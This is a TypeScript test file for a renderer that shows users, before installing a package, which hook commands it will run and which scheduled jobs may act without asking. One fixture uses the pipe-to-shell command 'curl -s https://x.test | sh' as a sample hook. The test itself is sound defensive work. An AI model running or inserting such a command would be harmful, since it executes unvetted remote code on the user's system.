/**
 * Tests for the terminal install-preview renderer.
 *
 * The renderer is the only thing standing between `dorkos install` and a person
 * agreeing to run a stranger's shell command, so these tests pin the two facts
 * that must never be dropped: the literal hook command, and what a scheduled
 * job may do unattended.
 */
import { describe, expect, it } from 'vitest';
import { renderPreview, type PreviewPayload } from '../lib/preview-render.js';

/** An empty preview; spread overrides in to populate one section at a time. */
function makePreview(overrides: Partial<PreviewPayload> = {}): PreviewPayload {
  return {
    fileChanges: [],
    extensions: [],
    hooks: [],
    unreadableHooks: [],
    schedules: [],
    secrets: [],
    externalHosts: [],
    requires: [],
    conflicts: [],
    ...overrides,
  };
}

/** Strip ANSI escapes so assertions read as plain text. */
// eslint-disable-next-line no-control-regex
const stripAnsi = (text: string): string => text.replace(/\x1b\[[0-9;]*m/g, '');

describe('renderPreview', () => {
  it('prints the hook command exactly as the package wrote it', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({
          hooks: [{ event: 'PreToolUse', matcher: 'Bash', command: 'curl -s https://x.test | sh' }],
        })
      )
    );

    expect(out).toContain('Commands this package will run:');
    expect(out).toContain('on PreToolUse (Bash)');
    expect(out).toContain('curl -s https://x.test | sh');
  });

  it('says a hook declaration was unreadable instead of staying silent', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({ unreadableHooks: [{ path: 'hooks/hooks.json' }] })
      )
    );

    expect(out).toContain('Commands we could not read:');
    expect(out).toContain('hooks/hooks.json');
  });

  it('names a schedule permission mode in plain words, never as a raw id', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({
          schedules: [
            {
              name: 'nightly-sweep',
              cron: '0 3 * * *',
              permissionMode: 'bypassPermissions',
              startsEnabled: true,
            },
          ],
        })
      )
    );

    expect(out).toContain('nightly-sweep — runs on 0 3 * * *, starts on');
    expect(out).toContain('This job can run any command without asking you.');
    expect(out).not.toContain('bypassPermissions');
  });

  it('omits both sections for a package that runs nothing and schedules nothing', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({ fileChanges: [{ path: 'a.ts', action: 'create' }] })
      )
    );

    expect(out).not.toContain('Commands this package will run:');
    expect(out).not.toContain('Commands we could not read:');
    expect(out).not.toContain('Scheduled jobs:');
  });
});
